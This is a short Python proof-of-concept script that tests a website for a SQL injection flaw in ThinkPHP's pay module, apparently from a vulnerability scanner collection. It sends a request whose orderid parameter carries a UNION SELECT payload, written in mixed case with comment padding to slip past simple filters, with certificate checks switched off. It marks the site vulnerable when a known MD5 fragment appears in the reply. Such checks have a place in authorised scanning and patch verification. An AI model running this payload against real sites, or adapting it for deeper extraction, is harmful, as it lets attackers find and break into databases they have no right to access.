#!/usr/bin/env python
# coding=utf-8
import urllib
import requests
import urllib3
urllib3.disable_warnings()

def thinkphp_pay_orderid_sqli_verify(url):
    pocdict = {
        "vulnname":"thinkphp_pay_orderid_sqli",
        "isvul": False,
        "vulnurl":"",
        "payload":"",
        "proof":"",
        "response":"",
        "exception":"",
    }
    headers = {
        "User-Agent" : 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:77.0)',
    }
    try:
        vurl = urllib.parse.urljoin(url, 'index.php?s=/home/pay/index/orderid/1%27)UnIoN/**/All/**/SeLeCT/**/Md5(2333)--+')
        req = requests.get(vurl, headers=headers, timeout=15, verify=False)
        if r"56540676a129760a" in req.text:
            pocdict['isvul'] = True
            pocdict['vulnurl'] = vurl
            pocdict['proof'] = '56540676a129760a'
            pocdict['response'] = req.text
            print(pocdict)

    except:
        pass
